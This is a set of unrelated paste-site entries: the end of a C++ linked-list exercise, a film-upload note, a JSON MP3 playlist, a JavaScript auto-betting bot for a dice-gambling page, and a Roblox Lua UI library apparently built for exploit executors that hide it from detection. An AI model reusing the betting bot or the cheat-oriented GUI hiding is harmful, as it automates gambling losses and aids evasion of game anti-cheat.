    Node *now = head;
    bool flag=0;
    while(now->next!= nullptr){
        if(now->next->data == value){
            flag=1;
            now->next = now->next->next;
            return;
        }
        now = now->next;
    }
    if(!flag)cout<<""value doesn't exit!\n"";
}

// Function to print the current content of the linked list
void printList(Node* head) {
    if(head==nullptr)return;
    do{
        cout<<head->data<<"" "";
        head = head->next;
    }while(head != nullptr);
    cout<<'\n';
}
//DO NOT MODIFY THE MAIN() CODE
int main() {
    Node* head = nullptr;

    int mode, value;

    while (true) {
        cin >> mode;
        switch (mode) {
            case 1:
                cin >> value;
                insertSorted(head, value);
                printList(head);
                break;

            case 2:
                cin >> value;
                deleteNode(head, value);
                printList(head);
                break;

            case 3:
                return 0;

            default:
                cout << ""Invalid choice. Please try again."" << endl;
                break;
        }
    }
    return 0;
}"
9Gx4iGat,Ostwind.I.Deu.1080p.h264.dts.Subs-bp,bpmircea,BrainFuck,Sunday 24th of December 2023 02:54:27 AM CDT,"Ostwind (Windstorm) (Katja von Garnier, 2013)
aka
Ostwind.I.Deu.1080p.h264.dts.Subs-bp
https://www.imdb.com/title/tt2356464/

Uploading..."
Z7PL17AL,WELCOME TO THE ZOO COMPILATION,spidersam,JSON,Sunday 24th of December 2023 02:41:05 AM CDT,"[
  {
    ""name"": ""01 Sig Wttz 2016 Original Classic (Jeffrey Jey) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/f0397b45-c4bc-1231-dacb-1330a8d00e3e.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""02 Sig Wttz 2017 Acustic Version (Jeffrey Jey) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/027b9ae8-c3a1-0f6d-c19c-67482ea1d51c.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""03 Sig Wttz 2017 Addio Leone Wender Mashup)"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/d6997aeb-571b-e758-7f16-3e36ae23d461.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""04 Sig Wttz 2018 Natale 2018 Demo (Wender)"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/0ca66d80-a915-0e3b-a08f-ac55cc469cda.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""05 Sig Wttz 2018 Ricchi E Poveri (Wender Mzrx)"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/70b41fc5-fe48-1159-1264-ca477c4b2a72.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""06 Sig Wttz 2018 (Ricchi E Poveri Dani Vit Ari Jeff) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/5e0ac746-7e78-f541-d80d-88218496deff.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""07 Sig Wttz 2018 (Feat Arianna Palazzetti \u0026 Jeffrey Jey)  Leggero Rmx Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/f135fba9-0354-b2c9-1405-67e6b75d0333.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""08 Sig Wttz 2018 (Feat Arianna Palazzetti) Gang Gang Gang Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/4976402a-3c03-3fb5-3054-f070cc7b16a7.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""09 Sig Wttz 2018 (Feat Arianna Palazzetti \u0026 Jeffrey Jey) Acustic Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/5ded1c60-37d6-2c6f-2555-c59d81721fdf.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""10 Sig Wttz 2019 Michael Arms (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/43f51bf2-754b-30de-eddb-d1257b034097.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""11 Sig Wttz 2019 Alesso (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/db27ba60-64db-5040-16c3-e65f084f820c.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""11 Sig Wttz 2019 Alesso (Feat Arianna Palazzetti) Wender(2)"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/5bbb9985-a0eb-0c48-0bf3-dc8eece45347.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""12 Sig Wttz 2019 Sta Andando Tutto Male (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/ebd6cfac-e618-f64d-f04b-e17a0156537a.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""13 Sig Wttz 2019 Orologi Fumagazzi (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/4abe5b55-32c1-df44-22b0-c64b8bfb59a8.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""14 Sig Wttz 2019 Mega Acapella (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/ff83952f-acbc-bccf-c668-ffca5c1d3dbb.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""15 Sig Wttz 2019 San Siro 20 Anni Di Zoo (Feat Jeffrey Jey \u0026 Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/bf29c880-8635-ec2f-68f5-fe1a44860282.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""16 Sig Wttz 2019 Meduza (Feat Arianna Palazzetti) 2019 Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/5ad9c3fc-af71-5dd4-ddd0-f14e3a6278e4.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""17 Sig Wttz 2019 Never Ending Story (Edit) (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/bfa24f88-97b2-dc60-a4a0-30fd84bf5b05.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""18 Sig Wttz 2020 Top Gun (Feat Arianna Palazzetti \u0026 Jeffrey Jey) Wender \u0026 Alisei)"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/a8275030-8e32-b6aa-2239-1afd7fc3afd0.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""19 Sig Wttz 2020 Synthwave (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/7fe2ecae-466e-6ace-42c7-580270469bb5.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""20 Sig Wttz 2020 Story Rmx (Jeffrey Jey) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/cdd63fb5-daa1-ce66-eab3-746beae19aae.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""21 Sig Wttz 2020 Petruzzelli (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/2167bb49-1e6d-64ad-f5d5-28f0c327521d.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""22 Sig Wttz 2020 Dj Falcon Daft Punk 2020 (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/edd995d6-f3d8-3cf1-16b1-f75abce6c308.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""23 Sig Wttz 2020 Jump (Jeffrey Jey) Wender \u0026 Alisei"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/765e7a2a-da37-49d4-70ac-21117c04d571.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""24 Sig Wttz 2020 Robert Miles Children (Jeffrey Jey) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/92528bd2-8d89-6d35-f2c8-365ba41d55dd.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""24 Sig Wttz 2020 Robert Miles Children (Jeffrey Jey) Wender(2)"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/41f97712-0737-5f85-1469-2278eea10d48.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""25 Sig Wttz 2021 Mystic Force (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/f3a1aac5-3438-9f86-fba8-73715427176d.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""26 Sig Wttz 2021 Depesce Pisciare Al Mare (Jeffrey Jey) Wender \u0026 Alisei"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/afea9eda-6842-42db-5d7b-20b006f25fbc.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""27 Sig Wttz 2021 Natale (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/699acb7d-0ac0-0926-5a51-3901ba786aad.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""28 Sig Wttz 2021 Depesce Crodino (Jeffrey Jey) Wender \u0026 Alisei"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/dfc2ad7a-e9ca-31cd-8006-fa3b50097e19.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""29 Sig Wttz 2021 Kids 2 Edit (Feat Arianna Palazzetti \u0026 Jeffrey Jey) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/bf80a3b9-8eba-3ccb-5f50-e67c7e5e71c3.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""30 Sig Wttz 2021 Jump (Jeffrey Jey) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/2984c4aa-fb58-5a17-38f4-be961777fc1a.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""31 Sig Wttz 2021 Pryda Lillo (Feat Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/4425b60f-a4f6-4f59-2ff1-1e55ff555476.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""32 Sig Wttz 2021 Mega Mashup Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/58dd0631-1b64-95a4-d2a0-52a8239ed2ec.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""33 Sig Wttz 2021 Summer (Jeffrey Jey \u0026 Arianna Palazzetti) Wender"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/327870a6-d657-9b45-214a-ae8aeee4dbbd.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""34 Sig Wttz 2022 Tiger Rocky Wender \u0026 Alisei"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/fe901f3c-2ddf-1f65-523b-3392a98c08e2.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""34 Sig Wttz 2022 Tiger Rocky Wender \u0026 Alisei(2)"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/c2f04f98-d376-f2b1-43ea-2b1e6ac466f1.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""35 Sig Wttz 2023 Remix (Feat Arianna Palazzetti \u0026 Jeffrey Jey) Wender \u0026 Mattdj"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/30d28a11-c060-4a6e-b731-8600740b9bba.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""35 Sig Wttz 2023 Remix (Feat Arianna Palazzetti \u0026 Jeffrey Jey) Wender \u0026 Mattdj(2)"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/7408db6e-9785-0b7a-84cc-c4c31ce572b2.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""36 Sig Wttz 2023 Natale Superman (Feat Arianna Palazzetti) Wender \u0026 Alisei"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/da22854f-6323-e35e-abd7-202c675d8def.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  },
  {
    ""name"": ""36 Sig Wttz 2023 Natale Superman (Feat Arianna Palazzetti) Wender \u0026 Alisei(2)"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/173ed336-730c-b4ad-91f7-c4a0af17b952.mp3"",
    ""imageUrl"": ""https://i.imgur.com/gkmBqN8m.jpg""
  }
]"
mJXMdxya,post manual snowybot,coinwalk,JavaScript,Sunday 24th of December 2023 02:35:21 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = (oldestbal/100); //dont change;
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.1)
var floatingbal = 0;
var betnext = ((botplus*1).toFixed(8));

 
function get(){
bellance = document.getElementById('pct_balance').value;
if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=floatingbal)) {
     botplus = botplus*2;    
     floatingbal  = parseFloat(bellance);
}
if ((((bellance-(oldestbal-(tens*2)))-(botplus*2))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0; 
}
if (((botplus*2)>=tens)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0;
    oldestbal = parseFloat(((Math.floor(bellance/tens))*tens));
}
if ((((bellance-(oldestbal-(tens*2)))-(botplus*2))<=0)&&(bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))){
    botplus = base*2;
    floatingbal  = parseFloat(bellance);
}
if ((bellance-(oldestbal-(tens)))<=0){
oldestbal = parseFloat(((Math.floor(bellance/tens))*tens));
botplus = base;
floatingbal = 0;
}
if (bellance>=(trget*24)){
console.log(""winner winner chicken dinner""); 
  return;
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_hi').click();
setTimeout(() => get(), 1000);
}
get();"
N3hfBWzW,Slash Ui Library,ZXPutra,Lua,Sunday 24th of December 2023 02:33:33 AM CDT,"local library = {}
local windowCount = 0
local sizes = {}
local listOffset = {}
local windows = {}
local pastSliders = {}
local dropdowns = {}
local dropdownSizes = {}
local destroyed

local colorPickers = {}

if game.CoreGui:FindFirstChild(""SlashUiLib"") then
	game.CoreGui:FindFirstChild(""SlashUiLib""):Destroy()
	destroyed = true
end

function Lerp(a, b, c)
	return a + ((b - a) * c)
end

local players = game:service(""Players"")
local player = players.LocalPlayer
local mouse = player:GetMouse()
local run = game:service(""RunService"")
local stepped = run.Stepped
function Dragify(obj)
	spawn(function()
		local minitial
		local initial
		local isdragging
		obj.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				isdragging = true
				minitial = input.Position
				initial = obj.Position
				local con
				con = stepped:Connect(function()
					if isdragging then
						local delta = Vector3.new(mouse.X, mouse.Y, 0) - minitial
						obj.Position = UDim2.new(initial.X.Scale, initial.X.Offset + delta.X, initial.Y.Scale, initial.Y.Offset + delta.Y)
					else
						con:Disconnect()
					end
				end)
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						isdragging = false
					end
				end)
		end
	end)
end)
end

local function protect_gui(obj)
if destroyed then
	obj.Parent = game.CoreGui
	return
end
if syn and syn.protect_gui then
syn.protect_gui(obj)
obj.Parent = game.CoreGui
elseif PROTOSMASHER_LOADED then
obj.Parent = get_hidden_gui()
else
obj.Parent = game.CoreGui
end
end
local SlashUiLib = Instance.new(""ScreenGui"")

SlashUiLib.Name = ""SlashUiLib""

protect_gui(SlashUiLib)

local xOffset = 20

local uis = game:GetService(""UserInputService"")

local keybindConnection

function library:Destroy()
	SlashUiLib:Destroy()
	if keybindConnection then
		keybindConnection:Disconnect()
	end
end
function library:Hide()
	SlashUiLib.Enabled = not SlashUiLib.Enabled
end	

function library:Keybind(key)
	if keybindConnection then keybindConnection:Disconnect() end

	keybindConnection = uis.InputBegan:Connect(function(input, gp)
		if not gp and input.KeyCode == Enum.KeyCode[key] then
			SlashUiLib.Enabled = not SlashUiLib.Enabled
		end
	end)
end

function library:Window(name)
	windowCount = windowCount + 1
	local winCount = windowCount
	local zindex = winCount * 7
	local UiWindow = Instance.new(""Frame"")

	UiWindow.Name = ""UiWindow""
	UiWindow.Parent = SlashUiLib
	UiWindow.BackgroundColor3 = Color3.fromRGB(100, 0, 190)
	UiWindow.BorderColor3 = Color3.fromRGB(100, 0, 190)
	UiWindow.Position = UDim2.new(0, xOffset, 0, 20)
	UiWindow.Size = UDim2.new(0, 207, 0, 33)
	UiWindow.ZIndex = 4 + zindex
	UiWindow.Active = true
	Dragify(UiWindow)

	xOffset = xOffset + 230

	local Header = Instance.new(""Frame"")
	Header.Name = ""Header""
	Header.Parent = UiWindow
	Header.BackgroundColor3 = Color3.fromRGB(100, 0, 190)
	Header.BorderColor3 = Color3.fromRGB(100, 0, 190)
	Header.Position = UDim2.new(0, 0, -0.0202544238, 0)
	Header.Size = UDim2.new(0, 207, 0, 26)
	Header.ZIndex = 5 + zindex

	local HeaderText = Instance.new(""TextLabel"")
	HeaderText.Name = ""HeaderText""
	HeaderText.Parent = Header
	HeaderText.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	HeaderText.BackgroundTransparency = 1.000
	HeaderText.Position = UDim2.new(0, 0, -0.0020698905, 0)
	HeaderText.Size = UDim2.new(0, 206, 0, 33)
	HeaderText.ZIndex = 6 + zindex
	HeaderText.Font = Enum.Font.SourceSans
	HeaderText.Text = name or ""Window""
	HeaderText.TextColor3 = Color3.fromRGB(0, 0, 0)
	HeaderText.TextSize = 17.000

	local Minimise = Instance.new(""TextButton"")
	local Window = Instance.new(""Frame"")
	Minimise.Name = ""Minimise""
	Minimise.Parent = Header
	Minimise.BackgroundColor3 = Color3.fromRGB(100, 0, 190)
	Minimise.BorderColor3 = Color3.fromRGB(100, 0, 190)
	Minimise.Position = UDim2.new(0, 185, 0, 2)
	Minimise.Size = UDim2.new(0, 22, 0, 22)
	Minimise.ZIndex = 7 + zindex
	Minimise.Font = Enum.Font.SourceSansLight
	Minimise.Text = ""_""
	Minimise.TextColor3 = Color3.fromRGB(0, 0, 0)
	Minimise.TextSize = 20.000
	Minimise.MouseButton1Up:connect(function()
		Window.Visible = not Window.Visible
	if Window.Visible then
		Minimise.Text = ""_""
	else
		Minimise.Text = ""+""
	end
	end)

	Window.Name = ""Window""
	Window.Parent = Header
	Window.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Window.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Window.Position = UDim2.new(0, 0, 0, 0)
	Window.Size = UDim2.new(0, 207, 0, 33)
	Window.ZIndex = 1 + zindex

	local UICorner = Instance.new(""UICorner"")
	UICorner.Parent = Window

	local functions = {}
	sizes[winCount] = 33
	listOffset[winCount] = 10
	function functions:Button(name, callback)
		local name = name or ""Button""
		local callback = callback or function() end

		sizes[winCount] = sizes[winCount] + 32
		Window.Size = UDim2.new(0, 207, 0, sizes[winCount] + 10)

		local Button = Instance.new(""TextButton"")
		listOffset[winCount] = listOffset[winCount] + 32
		Button.Name = ""Button""
		Button.Parent = Window
		Button.BackgroundColor3 = Color3.fromRGB(100, 0, 190)
		Button.BorderColor3 = Color3.fromRGB(100, 0, 190)
		Button.Position = UDim2.new(0, 12, 0, listOffset[winCount])
		Button.Size = UDim2.new(0, 182, 0, 26)
		Button.ZIndex = 2 + zindex
		Button.Selected = true
		Button.Font = Enum.Font.SourceSans
		Button.TextColor3 = Color3.fromRGB(0, 0, 0)
		Button.TextSize = 16.000
		Button.TextStrokeTransparency = 123.000
		Button.TextWrapped = true
		Button.Text = name
		Button.MouseButton1Down:Connect(callback)

		local UICorner = Instance.new(""UICorner"")
		UICorner.Parent = Button

		pastSliders[winCount] = false
	end
	function functions:Label(text, color)
		local color = color or Color3.fromRGB(255, 255, 255)

		sizes[winCount] = sizes[winCount] + 32
		Window.Size = UDim2.new(0, 207, 0, sizes[winCount] + 10)

		listOffset[winCount] = listOffset[winCount] + 32
		local Label = Instance.new(""TextLabel"")
		Label.Name = ""Label""
		Label.Parent = Window
		Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Label.BackgroundTransparency = 1.000
		Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Label.Position = UDim2.new(0, 0, 0, listOffset[winCount])
		Label.Size = UDim2.new(0, 206, 0, 29)
		Label.Font = Enum.Font.SourceSans
		Label.Text = text or ""Label""
		Label.TextSize = 16.000
		Label.ZIndex = 2 + zindex

		if type(color) == ""boolean"" and color then
		spawn(function()
				while wait() do
					local hue = tick() % 5 / 5
					Label.TextColor3 = Color3.fromHSV(hue, 1, 1)
				end
		end)
		else
			Label.TextColor3 = color
		end
		pastSliders[winCount] = false

	return Label
	end
	function functions:Toggle(text, on, callback)
		local callback = callback or function() end

		sizes[winCount] = sizes[winCount] + 32
		Window.Size = UDim2.new(0, 207, 0, sizes[winCount] + 10)

		listOffset[winCount] = listOffset[winCount] + 32

		local ToggleDescription = Instance.new(""TextLabel"")
		local ToggleButton = Instance.new(""TextButton"")
		local ToggleFiller = Instance.new(""Frame"")

		ToggleDescription.Name = ""ToggleDescription""
		ToggleDescription.Parent = Window
		ToggleDescription.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ToggleDescription.BackgroundTransparency = 1.000
		ToggleDescription.Position = UDim2.new(0, 14, 0, listOffset[winCount])
		ToggleDescription.Size = UDim2.new(0, 131, 0, 26)
		ToggleDescription.Font = Enum.Font.SourceSans
		ToggleDescription.Text = text or ""Toggle""
		ToggleDescription.TextColor3 = Color3.fromRGB(255, 255, 255)
		ToggleDescription.TextSize = 16.000
		ToggleDescription.TextWrapped = true
		ToggleDescription.TextXAlignment = Enum.TextXAlignment.Left
		ToggleDescription.ZIndex = 2 + zindex

		ToggleButton.Name = ""ToggleButton""
		ToggleButton.Parent = ToggleDescription
		ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		ToggleButton.BorderColor3 = Color3.fromRGB(100, 0, 190)
		ToggleButton.Position = UDim2.new(1.2061069, 0, 0.0769230798, 0)
		ToggleButton.Size = UDim2.new(0, 22, 0, 22)
		ToggleButton.Font = Enum.Font.SourceSans
		ToggleButton.Text = """"
		ToggleButton.TextColor3 = Color3.fromRGB(0, 0, 0)
		ToggleButton.TextSize = 14.000
		ToggleButton.ZIndex = 2 + zindex
		ToggleButton.MouseButton1Up:Connect(function()
			ToggleFiller.Visible = not ToggleFiller.Visible
			callback(ToggleFiller.Visible)
		end)

		ToggleFiller.Name = ""ToggleFiller""
		ToggleFiller.Parent = ToggleButton
		ToggleFiller.BackgroundColor3 = Color3.fromRGB(100, 0, 190)
		ToggleFiller.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ToggleFiller.Position = UDim2.new(0, 5, 0, 5)
		ToggleFiller.Size = UDim2.new(0, 12, 0, 12)
		ToggleFiller.Visible = on
		ToggleFiller.ZIndex = 2 + zindex
		pastSliders[winCount] = false
	end
	function functions:Box(text, callback)
		local callback = callback or function() end

		sizes[winCount] = sizes[winCount] + 32
		Window.Size = UDim2.new(0, 207, 0, sizes[winCount] + 10)

		listOffset[winCount] = listOffset[winCount] + 32
		local TextBox = Instance.new(""TextBox"")
		local BoxDescription = Instance.new(""TextLabel"")
		TextBox.Parent = Window
		TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TextBox.BorderColor3 = Color3.fromRGB(100, 0, 190)
		TextBox.Position = UDim2.new(0, 99, 0, listOffset[winCount])
		TextBox.Size = UDim2.new(0, 95, 0, 26)
		TextBox.Font = Enum.Font.SourceSans
		TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
		TextBox.PlaceholderText = ""...""
		TextBox.Text = """"
		TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextBox.TextSize = 16.000
		TextBox.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
		TextBox.ZIndex = 2 + zindex
		TextBox:GetPropertyChangedSignal(""Text""):connect(function()
			callback(TextBox.Text, false)
		end)
		TextBox.FocusLost:Connect(function()
			callback(TextBox.Text, true)
		end)

		BoxDescription.Name = ""BoxDescription""
		BoxDescription.Parent = TextBox
		BoxDescription.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		BoxDescription.BackgroundTransparency = 1.000
		BoxDescription.Position = UDim2.new(-0.894736826, 0, 0, 0)
		BoxDescription.Size = UDim2.new(0, 75, 0, 26)
		BoxDescription.Font = Enum.Font.SourceSans
		BoxDescription.Text = text or ""Box""
		BoxDescription.TextColor3 = Color3.fromRGB(255, 255, 255)
		BoxDescription.TextSize = 16.000
		BoxDescription.TextXAlignment = Enum.TextXAlignment.Left
		BoxDescription.ZIndex = 2 + zindex
		pastSliders[winCount] = false
	end
	function functions:Slider(text, min, max, default, callback)
		local text = text or ""Slider""
		local min = min or 1
		local max = max or 100
		local default = default or max/2
		local callback = callback or function() end
		local offset = 70
		if default > max then
			default = max
		elseif default < min then
			default = min
		end

		if pastSliders[winCount] then
			offset = 60
		end

		sizes[winCount] = sizes[winCount] + offset
		Window.Size = UDim2.new(0, 207, 0, sizes[winCount] + 10)

		listOffset[winCount] = listOffset[winCount] + offset

		local Slider = Instance.new(""Frame"")
		local SliderButton = Instance.new(""Frame"")
		local Description = Instance.new(""TextLabel"")
		local SilderFiller = Instance.new(""Frame"")
		local Current = Instance.new(""TextLabel"")
		local Min = Instance.new(""TextLabel"")
		local Max = Instance.new(""TextLabel"")

		function SliderMovement(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				isdragging = true
					minitial = input.Position.X
					initial = SliderButton.Position.X.Offset
					local delta1 = SliderButton.AbsolutePosition.X - initial
					local con
					con = stepped:Connect(function()
						if isdragging then
							local xOffset = mouse.X - delta1 - 3
							if xOffset > 175 then
								xOffset = 175
							elseif xOffset< 0 then
								xOffset = 0
							end
							SliderButton.Position = UDim2.new(0, xOffset , -1.33333337, 0)
							SilderFiller.Size = UDim2.new(0, xOffset, 0, 6)
							local value = Lerp(min, max, SliderButton.Position.X.Offset/(Slider.Size.X.Offset-5))
							Current.Text = tostring(math.round(value))
						else
							con:Disconnect()
						end
					end)
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							isdragging = false
						end
					end)
			end
		end
		function SliderEnd(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			local value = Lerp(min, max, SliderButton.Position.X.Offset/(Slider.Size.X.Offset-5))
			callback(math.round(value))
			end
		end

		Slider.Name = ""Slider""
		Slider.Parent = Window
		Slider.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Slider.BorderColor3 = Color3.fromRGB(100, 0, 190)
